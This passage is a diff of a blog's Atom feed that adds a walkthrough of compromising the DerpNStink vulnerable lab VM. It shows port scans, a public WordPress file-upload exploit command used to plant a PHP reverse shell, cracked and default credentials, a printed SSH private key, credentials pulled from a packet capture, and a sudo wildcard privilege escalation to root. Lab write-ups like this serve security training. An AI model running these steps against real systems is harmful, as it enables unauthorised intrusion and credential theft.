@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-04-15T21:12:12+03:00</updated>
+  <updated>2019-05-19T20:52:52+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,582 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Derpnstink]]></title>
+    <link href="http://chousensha.github.io/blog/2019/05/19/derpnstink/"/>
+    <updated>2019-05-19T20:36:18+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/05/19/derpnstink</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs and it has 4 flags to collect.</p>
+
+<blockquote><p>Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live&hellip;</p></blockquote>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ORT   STATE SERVICE VERSION
+</span><span class='line'>21/tcp open  ftp     vsftpd 3.0.2
+</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
+</span><span class='line'>|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
+</span><span class='line'>|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
+</span><span class='line'>|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+</span><span class='line'>| http-robots.txt: 2 disallowed entries
+</span><span class='line'>|_/php/ /temporary/
+</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
+</span><span class='line'>|_http-title: DeRPnStiNK</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/derpnstink/derpnstink.png" title="derpnstink" alt="derpnstink"></p>
+
+<p>Let&rsquo;s check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a <em>/weblog</em> folder:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/weblog (Status: 301)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/derpnstink/weblog.png" title="weblog" alt="weblog"></p>
+
+<p>This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
+</span><span class='line'> |     Fixed in: 5.0.1
+</span><span class='line'> |     References:
+</span><span class='line'> |      - https://wpvulndb.com/vulnerabilities/9222
+</span><span class='line'> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
+</span><span class='line'> |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
+</span><span class='line'>
+</span><span class='line'> [!] Title: Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload
+</span><span class='line'>  |     Fixed in: 1.4.7
+</span><span class='line'>  |     References:
+</span><span class='line'>  |      - https://wpvulndb.com/vulnerabilities/7532
+</span><span class='line'>  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
+</span><span class='line'>  |      - https://www.exploit-db.com/exploits/34681/
+</span><span class='line'>  |      - https://www.exploit-db.com/exploits/34514/
+</span><span class='line'>  |      - http://seclists.org/bugtraq/2014/Sep/1
+</span><span class='line'>  |      - http://packetstormsecurity.com/files/131526/
+</span><span class='line'>  |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It seems not much can be done without authentication, so I went to wp-admin and enumerated the username <em>admin</em> as a valid user&hellip;and in the process also discovered that the password is <em>admin</em>..derp! Now I could use an <a href="https://www.exploit-db.com/exploits/34681">exploit for the authenticated arbitrary file upload</a> with <code>python gallery.py -t <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at <a href="http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php">http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php</a></p>
+
+<p>From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/** The name of the database for WordPress */
+</span><span class='line'>define('DB_NAME', 'wordpress');
+</span><span class='line'>
+</span><span class='line'>/** MySQL database username */
+</span><span class='line'>define('DB_USER', 'root');
+</span><span class='line'>
+</span><span class='line'>/** MySQL database password */
+</span><span class='line'>define('DB_PASSWORD', 'mysql');
+</span><span class='line'>
+</span><span class='line'>/** MySQL hostname */
+</span><span class='line'>define('DB_HOST', 'localhost');</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside <code>/var/www/html/php/info.php</code> there is a line stating that there&rsquo;s a PHPMyAdmin interface:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* management interface can be found at /phpmyadmin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I went to <a href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a> and used the credentials to get in the wordpress database and get 2 users and hashes:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/derpnstink/users.png" title="users" alt="users"></p>
+
+<p>We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password <em>wedgie57</em> for user <em>unclestinky</em>. My first move was to try SSH&#8217;ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials <em>stinky</em>:<em>wedgie57</em> (there was no unclestinky user configured on the system)</p>
+
+<p>On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r <a href="ftp://derpnstink.local/files">ftp://derpnstink.local/files</a> &mdash;ftp-user=stinky &mdash;ftp-password=wedgie57</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; dir
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
+</span><span class='line'>226 Directory send OK.
+</span><span class='line'>ftp&gt; ls files
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
+</span><span class='line'>drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
+</span><span class='line'>-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
+</span><span class='line'>drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside network-logs there&rsquo;s a file that hints at some PCAP analysis:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat derpissues.txt
+</span><span class='line'>12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
+</span><span class='line'>12:07 stinky: yeah. did you need a password reset?
+</span><span class='line'>12:07 mrderp: I think i accidently deleted my account
+</span><span class='line'>12:07 mrderp: i just need to logon once to make a change
+</span><span class='line'>12:07 stinky: im gonna packet capture so we can figure out whats going on
+</span><span class='line'>12:07 mrderp: that seems a bit overkill, but wtv
+</span><span class='line'>12:08 stinky: commence the sniffer!!!!
+</span><span class='line'>12:08 mrderp: -_-
+</span><span class='line'>12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
+</span><span class='line'>12:11 mrderp: awesome it works!
+</span><span class='line'>12:12 stinky: we really are the best sysadmins #team
+</span><span class='line'>12:13 mrderp: i guess we are...
+</span><span class='line'>12:15 mrderp: alright I made the changes, feel free to decomission my account
+</span><span class='line'>12:20 stinky: done! yay</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside <em>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</em> there&rsquo;s a private key:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat key.txt
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
+</span><span class='line'>2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
+</span><span class='line'>uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
+</span><span class='line'>AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
+</span><span class='line'>5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
+</span><span class='line'>LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
+</span><span class='line'>nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
+</span><span class='line'>D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
+</span><span class='line'>ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
+</span><span class='line'>Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
+</span><span class='line'>YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
+</span><span class='line'>DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
+</span><span class='line'>VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
+</span><span class='line'>Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
+</span><span class='line'>VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
+</span><span class='line'>fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
+</span><span class='line'>7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
+</span><span class='line'>L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
+</span><span class='line'>cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
+</span><span class='line'>gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
+</span><span class='line'>RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
+</span><span class='line'>14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
+</span><span class='line'>pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
+</span><span class='line'>UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
+</span><span class='line'>a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
+</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can SSH on the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -i stinky_key stinky@derpnstink.local
+</span><span class='line'>Ubuntu 14.04.5 LTS
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>                       ,~~~~~~~~~~~~~..
+</span><span class='line'>                       '  Derrrrrp  N  `
+</span><span class='line'>        ,~~~~~~,       |    Stink      |
+</span><span class='line'>       / ,      \      ',  ________ _,"
+</span><span class='line'>      /,~|_______\.      \/
+</span><span class='line'>     /~ (__________)
+</span><span class='line'>    (*)  ; (^)(^)':
+</span><span class='line'>        =;  ____  ;
+</span><span class='line'>          ; """"  ;=
+</span><span class='line'>   {"}_   ' '""' ' _{"}
+</span><span class='line'>   \__/     &gt;  &lt;   \__/
+</span><span class='line'>      \    ,"   ",  /
+</span><span class='line'>       \  "       /"
+</span><span class='line'>          "      "=
+</span><span class='line'>           &gt;     &lt;
+</span><span class='line'>          ="     "-
+</span><span class='line'>          -`.   ,'
+</span><span class='line'>                -
+</span><span class='line'>            `--'
+</span><span class='line'>
+</span><span class='line'>Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>
+</span><span class='line'>331 packages can be updated.
+</span><span class='line'>231 updates are security updates.
+</span><span class='line'>
+</span><span class='line'>Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
+</span><span class='line'>stinky@DeRPnStiNK:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside Documents there&rsquo;s the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user_login=mrderp
+</span><span class='line'>pass1=derpderpderpderpderpderpderp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
+</span><span class='line'>From: Help Desk &lt;helpdesk@derpnstink.local&gt;
+</span><span class='line'>Date: Thu, Aug 23, 2017 at 1:29 PM
+</span><span class='line'>Subject: sudoers ISSUE=242 PROJ=26
+</span><span class='line'>To: Derp, Mr (mrderp) [C]
+</span><span class='line'>When replying, type your text above this line.
+</span><span class='line'>
+</span><span class='line'>Help Desk Ticket Notification
+</span><span class='line'>Thank you for contacting the Help Desk. Your ticket information is below. If you have any
+</span><span class='line'>additional information to add to this ticket, please reply to this notification.
+</span><span class='line'>If you need immediate help (i.e. you are within two days of a deadline or in the event of a
+</span><span class='line'>security emergency), call us. Note that the Help Desk's busiest hours are between 10 a.m. (ET)
+</span><span class='line'>and 3 p.m. (ET).
+</span><span class='line'>
+</span><span class='line'>Toll-free: 1-866-504-9552
+</span><span class='line'>Phone: 301-402-7469
+</span><span class='line'>TTY: 301-451-5939
+</span><span class='line'>Ticket Title: Sudoers File issues
+</span><span class='line'>Ticket Number: 242
+</span><span class='line'>Status: Break/fix
+</span><span class='line'>Date Created: 08/23/2017
+</span><span class='line'>Latest Update Date: 08/23/2017
+</span><span class='line'>Contact Name: Mr Derp
+</span><span class='line'>CC’s: Uncle Stinky
+</span><span class='line'>Full description and latest notes on your Ticket: Sudoers File issues
+</span><span class='line'>Notification
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>Service Desk
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Listen with focus, answer with accuracy, assist with compassion.
+</span><span class='line'>
+</span><span class='line'>From: Help Desk
+</span><span class='line'>Date: Mon, Sep 10, 2017 at 2:53 PM
+</span><span class='line'>Subject: sudoers ISSUE=242 PROJ=26
+</span><span class='line'>To: Derp, Mr (mrderp) [C]
+</span><span class='line'>When replying, type your text above this line.
+</span><span class='line'>
+</span><span class='line'>Closed Ticket Notification
+</span><span class='line'>
+</span><span class='line'>Thank you for contacting the Help Desk. Your ticket information and its resolution is
+</span><span class='line'>below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
+</span><span class='line'>assistance, please reply to this notification to provide additional information.
+</span><span class='line'>If you need immediate help (i.e. you are within two days of a deadline or in the event of a
+</span><span class='line'>security emergency), call us or visit our Self Help Web page at https://pastebin.com/RzK9WfGw
+</span><span class='line'>Note that the Help Desk's busiest hours are between 10 a.m. (ET)
+</span><span class='line'>and 3 p.m. (ET).
+</span><span class='line'>Toll-free: 1-866-504-9552
+</span><span class='line'>Phone: 301-402-7469
+</span><span class='line'>TTY: 301-451-5939
+</span><span class='line'>Ticket Title: sudoers issues
+</span><span class='line'>Ticket Number: 242
+</span><span class='line'>Status: Closed
+</span><span class='line'>Date Created: 09/10/2017
+</span><span class='line'>Latest Update Date: 09/10/2017
+</span><span class='line'>CC’s:
+</span><span class='line'>Resolution: Closing ticket. ticket notification.
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>eRA Service Desk
+</span><span class='line'>Listen with focus, answer with accuracy, assist with compassion.
+</span><span class='line'>For more information, dont forget to visit the Self Help Web page!!!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt
+</span><span class='line'>*******************************************************************
+</span><span class='line'>On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.
+</span><span class='line'>
+</span><span class='line'>However i dont want to specify each command to allow
+</span><span class='line'>
+</span><span class='line'>How can I exclude these commands from password protection to sudo?
+</span><span class='line'>
+</span><span class='line'>********************************************************************
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>********************************************************************
+</span><span class='line'>Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.
+</span><span class='line'>
+</span><span class='line'>Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.
+</span><span class='line'>
+</span><span class='line'>Thank you for using our product.
+</span><span class='line'>
+</span><span class='line'>********************************************************************</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running a <strong>sudo -l</strong> gives us the sudo commands that mrderp can run:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User mrderp may run the following commands on DeRPnStiNK:
+</span><span class='line'>    (ALL) /home/mrderp/binaries/derpy*</span></code></pre></td></tr></table></div></figure>
+
+
+<p>All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
+</span><span class='line'>mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
+</span><span class='line'>[sudo] password for mrderp:
+</span><span class='line'>root@DeRPnStiNK:~/binaries#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@DeRPnStiNK:/root# cat Desktop/flag.txt
+</span><span class='line'>flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
+</span><span class='line'>
+</span><span class='line'>Congrats on rooting my first VulnOS!
+</span><span class='line'>
+</span><span class='line'>Hit me up on twitter and let me know your thoughts!
+</span><span class='line'>
+</span><span class='line'>@securekomodo</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>______________________________________
+</span><span class='line'>/ You need more time; and you probably \
+</span><span class='line'>\ always will.                         /
+</span><span class='line'>--------------------------------------
+</span><span class='line'>       \   ^__^
+</span><span class='line'>        \  (oo)\_______
+</span><span class='line'>           (__)\       )\/\
+</span><span class='line'>               ||----w |
+</span><span class='line'>               ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Donkey Docker]]></title>
@@ -5739,9 +6315,9 @@ file. There are no restrictions on the format of the secret data.</p></blockquot
 <p>The contact page gives us some names and mail addresses:</p>
 
 <ul>
-<li>Roger S. Michaels &ndash; <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x6d;&#105;&#99;&#x68;&#97;&#x65;&#x6c;&#x73;&#64;&#105;&#x6d;&#x66;&#46;&#x6c;&#x6f;&#x63;&#97;&#x6c;">&#x72;&#109;&#105;&#99;&#104;&#x61;&#101;&#x6c;&#x73;&#x40;&#105;&#x6d;&#102;&#46;&#x6c;&#111;&#x63;&#x61;&#108;</a></li>
